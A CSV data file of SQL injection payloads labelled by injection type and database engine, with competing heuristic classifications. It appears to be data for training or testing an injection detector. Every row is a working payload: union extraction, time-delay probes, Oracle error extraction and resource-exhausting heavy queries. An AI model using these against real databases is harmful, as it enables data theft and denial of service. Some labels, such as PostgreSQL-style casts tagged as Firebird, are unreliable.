payload_norm,sqli_type,db_engine,confidence,reasoning,verdict,critique_reasons,suggested_type,suggested_db,id,a_type,a_db,a_signals,c_type,c_db,c_signals,payload_inner
"1"" ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ""duuw"" = ""duuw",boolean_blind,firebird,0.8,CAST for Firebird blind,KEEP,,boolean_blind,firebird,1941,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"1"" ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ""duuw"" = ""duuw"
1'+ ( select 'kicv' where 1976 = 1976 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) ) +',error_based,oracle,0.85,xmltype for error extraction,KEEP,,error_based,oracle,1942,error_based,oracle,Pattern match: 'xmltype (' → error_based (P4); DB signature: oracle,boolean_blind,oracle,generic SQL structure without strong signal,1'+ ( select 'kicv' where 1976 = 1976 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) ) +'
"1%"" and 6408 = 7959--",boolean_blind,generic,0.8,AND equality for blind,KEEP,,boolean_blind,generic,1943,boolean_blind,generic,Pattern match: 'and 6408 = 7959' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","1%"" and 6408 = 7959--"
1' and sleep ( 5 ),time_blind,generic,0.9,sleep() for time blind,KEEP,,time_blind,generic,1944,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,benign,generic,no SQLi signal in heuristic check,1' and sleep ( 5 )
"1', ( select ( case when ( 5433 = 5433 ) then 1 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual )",boolean_blind,generic,0.8,SELECT CASE WHEN for blind,KEEP,,boolean_blind,generic,1945,boolean_blind,oracle,generic SQL keywords without specific signal,boolean_blind,oracle,generic SQL structure without strong signal,"1', ( select ( case when ( 5433 = 5433 ) then 1 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual )"
"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and ( ( '%' = '",heavy_query,mysql,0.85,benchmark for heavy query,KEEP,,heavy_query,mysql,1946,time_blind,mysql,Pattern match: 'benchmark (' → time_blind (P5); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and ( ( '%' = '"
select case when 4176 = 6138 then 1 else null end--,boolean_blind,generic,0.8,SELECT CASE WHEN for blind,KEEP,,boolean_blind,generic,1947,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,select case when 4176 = 6138 then 1 else null end--
"1"" ) as hfvz where 7186 = 7186 union all select null,null,null,null,null,null#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1948,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1"" ) as hfvz where 7186 = 7186 union all select null,null,null,null,null,null#"
"-3461"" ) ) union all select 6342,6342,6342,6342,6342,6342#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1949,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-3461"" ) ) union all select 6342,6342,6342,6342,6342,6342#"
-5134 ) ) ) or 8571 = 8571--,boolean_blind,generic,0.8,OR equality for blind,KEEP,,boolean_blind,generic,1950,boolean_blind,generic,Pattern match: 'or 8571 = 8571' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",-5134 ) ) ) or 8571 = 8571--
"-3856"" ) as iyzl where 7394 = 7394 or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --",boolean_blind,mssql,0.8,CONVERT INT for blind,KEEP,,boolean_blind,mssql,1951,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"-3856"" ) as iyzl where 7394 = 7394 or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --"
"1"" ) ) ) or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #",time_blind,generic,0.9,sleep() for time blind,KEEP,,time_blind,generic,1952,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,"1"" ) ) ) or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #"
"-9456%"" ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ""%"" = """,boolean_blind,firebird,0.8,CAST for Firebird blind,KEEP,,boolean_blind,firebird,1953,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"-9456%"" ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ""%"" = """
"-1168 ) ) as vlol where 3475 = 3475 or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",boolean_blind,mysql,0.8,group by concat for boolean blind,KEEP,,boolean_blind,mysql,1954,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload),"-1168 ) ) as vlol where 3475 = 3475 or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #"
select ( case when ( 3681 = 5989 ) then 3681 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--,boolean_blind,generic,0.8,SELECT CASE WHEN for blind,KEEP,,boolean_blind,generic,1955,boolean_blind,oracle,generic SQL keywords without specific signal,boolean_blind,oracle,generic SQL structure without strong signal,select ( case when ( 3681 = 5989 ) then 3681 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--
-9143 ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ),boolean_blind,firebird,0.8,CAST for Firebird blind,KEEP,,boolean_blind,firebird,1956,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,-9143 ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric )
"-8614' ) or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",boolean_blind,mysql,0.8,group by concat for boolean blind,KEEP,,boolean_blind,mysql,1957,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload),"-8614' ) or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #"
1%' ) ) and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( ( '%' = ',boolean_blind,firebird,0.8,CHAR case when for blind,KEEP,,boolean_blind,firebird,1958,boolean_blind,firebird,generic SQL keywords without specific signal,boolean_blind,firebird,generic SQL structure without strong signal,1%' ) ) and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( ( '%' = '
"1"" ) where 5814 = 5814 and 6969 = ( select 6969 from pg_sleep ( 5 ) ) --",time_blind,postgresql,0.9,pg_sleep for PostgreSQL time blind,KEEP,,time_blind,postgresql,1959,time_blind,postgresql,Pattern match: 'pg_sleep (' → time_blind (P5); DB signature: postgresql,boolean_blind,postgresql,generic SQL structure without strong signal,"1"" ) where 5814 = 5814 and 6969 = ( select 6969 from pg_sleep ( 5 ) ) --"
1' ) where 2763 = 2763,boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,1960,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1' ) where 2763 = 2763
1' where 8770 = 8770 union all select null--,boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,1961,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,1' where 8770 = 8770 union all select null--
1'+ ( select 'vnue' where 5807 = 5807,boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,1962,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,1'+ ( select 'vnue' where 5807 = 5807
1' ) ) ) rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) and ( ( ( 'gsjp' = 'gsjp,boolean_blind,generic,0.8,RLIKE case when for blind,KEEP,,boolean_blind,generic,1963,boolean_blind,mysql,Pattern match: 'rlike (' → boolean_blind (P3); DB signature: mysql,boolean_blind,mysql,"boolean condition (1=1, RLIKE, or ELT)",1' ) ) ) rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) and ( ( ( 'gsjp' = 'gsjp
"-3666"" ) ) ) union all select 4136,4136,4136--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1964,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-3666"" ) ) ) union all select 4136,4136,4136--"
"1%"" ) or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #",time_blind,generic,0.9,sleep() for time blind,KEEP,,time_blind,generic,1965,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,"1%"" ) or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #"
"-3037 ) where 9024 = 9024 union all select 9024,9024--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1966,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-3037 ) where 9024 = 9024 union all select 9024,9024--"
"1 ) ) union all select null,null,null,null--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1967,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1 ) ) union all select null,null,null,null--"
-2452' ) ) ) union all select 1951--,union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1968,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,-2452' ) ) ) union all select 1951--
"1' ) as ghks where 5128 = 5128 union all select null,null,null,null,null,null,null,null,null,null#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1969,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1' ) as ghks where 5128 = 5128 union all select null,null,null,null,null,null,null,null,null,null#"
1'+ ( select 'mquh' where 3933 = 3933,boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,1970,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,1'+ ( select 'mquh' where 3933 = 3933
-9556 or ( 2049 = 6967 ) *6967# mhbc,boolean_blind,generic,0.75,Multiplication for blind,KEEP,,boolean_blind,generic,1971,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,-9556 or ( 2049 = 6967 ) *6967# mhbc
select case when 3252 = 9622 then 1 else null end--,boolean_blind,generic,0.8,SELECT CASE WHEN for blind,KEEP,,boolean_blind,generic,1972,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,select case when 3252 = 9622 then 1 else null end--
"select count ( * ) from generate_series ( 1,5000000 ) and ( 'cewn' = 'cewn",heavy_query,postgresql,0.9,generate_series for heavy query,KEEP,,heavy_query,postgresql,1973,heavy_query,postgresql,"Pattern match: 'generate_series ( 1,5000000 )' → heavy_query (P4); DB signature: postgresql",heavy_query,postgresql,contains 7+ digit number (DoS-style payload),"select count ( * ) from generate_series ( 1,5000000 ) and ( 'cewn' = 'cewn"
"1"" ) ) as maxe where 5883 = 5883 union all select null,null,null,null,null,null,null,null,null#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1974,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1"" ) ) as maxe where 5883 = 5883 union all select null,null,null,null,null,null,null,null,null#"
1' ) union all select null--,union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1975,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,1' ) union all select null--
"-3379 ) union all select 4985,4985,4985,4985,4985,4985,4985,4985,4985,4985--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1976,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-3379 ) union all select 4985,4985,4985,4985,4985,4985,4985,4985,4985,4985--"
"1 ) ) as oqfr where 6426 = 6426 and make_set ( 8403 = 8403,8899 ) --",boolean_blind,mysql,0.8,make_set() for boolean blind,KEEP,,boolean_blind,mysql,1977,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"1 ) ) as oqfr where 6426 = 6426 and make_set ( 8403 = 8403,8899 ) --"
1'|| ( select 'aioq' from dual where 8176 = 8176,boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,1978,boolean_blind,oracle,generic SQL keywords without specific signal,boolean_blind,oracle,generic SQL structure without strong signal,1'|| ( select 'aioq' from dual where 8176 = 8176
"-7460"" union all select 4273,4273,4273,4273,4273,4273,4273,4273#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1979,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-7460"" union all select 4273,4273,4273,4273,4273,4273,4273,4273#"
"1"" ) ) ) or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",heavy_query,sqlite,0.9,randomblob for heavy query,KEEP,,heavy_query,sqlite,1980,time_blind,sqlite,Pattern match: 'randomblob (' → time_blind (P5); DB signature: sqlite,heavy_query,sqlite,contains 7+ digit number (DoS-style payload),"1"" ) ) ) or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --"
"-5062"" ) ) ) or ( 1069 = 8974 ) *8974 and ( ( ( ""hsge"" = ""hsge",boolean_blind,generic,0.75,Multiplication for blind,KEEP,,boolean_blind,generic,1981,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,"-5062"" ) ) ) or ( 1069 = 8974 ) *8974 and ( ( ( ""hsge"" = ""hsge"
"1"" ) ) and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ""yrgy"" like ""yrgy",heavy_query,sqlite,0.9,randomblob for heavy query,KEEP,,heavy_query,sqlite,1982,time_blind,sqlite,Pattern match: 'randomblob (' → time_blind (P5); DB signature: sqlite,heavy_query,sqlite,contains 7+ digit number (DoS-style payload),"1"" ) ) and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ""yrgy"" like ""yrgy"
"1'+ ( select bldn where 8321 = 8321 and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",heavy_query,postgresql,0.9,generate_series for heavy query,KEEP,,heavy_query,postgresql,1983,heavy_query,postgresql,"Pattern match: 'generate_series ( 1,5000000 )' → heavy_query (P4); DB signature: postgresql",heavy_query,postgresql,contains 7+ digit number (DoS-style payload),"1'+ ( select bldn where 8321 = 8321 and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --"
1' where 4388 = 4388,boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,1984,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1' where 4388 = 4388
"-7469 ) where 5875 = 5875 or make_set ( 9354 = 9354,7185 ) --",boolean_blind,mysql,0.8,make_set() for boolean blind,KEEP,,boolean_blind,mysql,1985,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"-7469 ) where 5875 = 5875 or make_set ( 9354 = 9354,7185 ) --"
-6755 ) or 9323 = 9323#,boolean_blind,generic,0.8,OR equality for blind,KEEP,,boolean_blind,generic,1986,boolean_blind,generic,Pattern match: 'or 9323 = 9323' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",-6755 ) or 9323 = 9323#
"1 ) and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) )",error_based,oracle,0.85,ctxsys.drithsx for error extraction,KEEP,,error_based,oracle,1987,error_based,oracle,Pattern match: 'ctxsys.drithsx' → error_based (P4); DB signature: oracle,error_based,oracle,error function 'ctxsys.drithsx' detected,"1 ) and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) )"
"1'+ ( select yfuu where 1717 = 1717 union all select null,null,null,null,null,null,null,null,null--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1988,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1'+ ( select yfuu where 1717 = 1717 union all select null,null,null,null,null,null,null,null,null--"
"1"" ) where 2657 = 2657 and 5309 = 7592--",boolean_blind,generic,0.8,AND equality for blind,KEEP,,boolean_blind,generic,1989,boolean_blind,generic,Pattern match: 'and 5309 = 7592' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","1"" ) where 2657 = 2657 and 5309 = 7592--"
1 ) and 3659 = 5475 and ( 8949 = 8949,boolean_blind,generic,0.75,Multiplication for blind,KEEP,,boolean_blind,generic,1990,boolean_blind,generic,Pattern match: 'and 3659 = 5475' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",1 ) and 3659 = 5475 and ( 8949 = 8949
1'+ ( select aqhj where 4419 = 4419,boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,1991,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,1'+ ( select aqhj where 4419 = 4419
"-1868"" ) where 9495 = 9495 or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",boolean_blind,mysql,0.8,group by concat for boolean blind,KEEP,,boolean_blind,mysql,1992,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload),"-1868"" ) where 9495 = 9495 or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #"
"1 ) ) ) or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",time_blind,oracle,0.9,dbms_pipe for Oracle time blind,KEEP,,time_blind,oracle,1993,time_blind,oracle,Pattern match: 'dbms_pipe.receive_message' → time_blind (P5); DB signature: oracle,time_blind,oracle,time function 'dbms_pipe' detected,"1 ) ) ) or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --"
"-7806"" ) ) or ( 8459 = 8459 ) *4906 and ( ( ""vlrj"" like ""vlrj",boolean_blind,generic,0.75,Multiplication for blind,KEEP,,boolean_blind,generic,1994,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,"-7806"" ) ) or ( 8459 = 8459 ) *4906 and ( ( ""vlrj"" like ""vlrj"
select sleep ( 5 ) -- waln,time_blind,generic,0.9,sleep() for time blind,KEEP,,time_blind,generic,1995,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,select sleep ( 5 ) -- waln
"-5863"" or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ""gkvy"" = ""gkvy",error_based,oracle,0.85,xmltype for error extraction,KEEP,,error_based,oracle,1996,error_based,oracle,Pattern match: 'xmltype (' → error_based (P4); DB signature: oracle,boolean_blind,oracle,generic SQL structure without strong signal,"-5863"" or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ""gkvy"" = ""gkvy"
"1%"" and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ""%"" = """,heavy_query,sqlite,0.9,randomblob for heavy query,KEEP,,heavy_query,sqlite,1997,time_blind,sqlite,Pattern match: 'randomblob (' → time_blind (P5); DB signature: sqlite,heavy_query,sqlite,contains 7+ digit number (DoS-style payload),"1%"" and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ""%"" = """
"-2048 ) ) union all select 7054,7054,7054,7054,7054,7054,7054,7054,7054--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1998,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-2048 ) ) union all select 7054,7054,7054,7054,7054,7054,7054,7054,7054--"
"1"" where 6347 = 6347 union all select null,null,null,null,null,null,null,null#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1999,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1"" where 6347 = 6347 union all select null,null,null,null,null,null,null,null#"
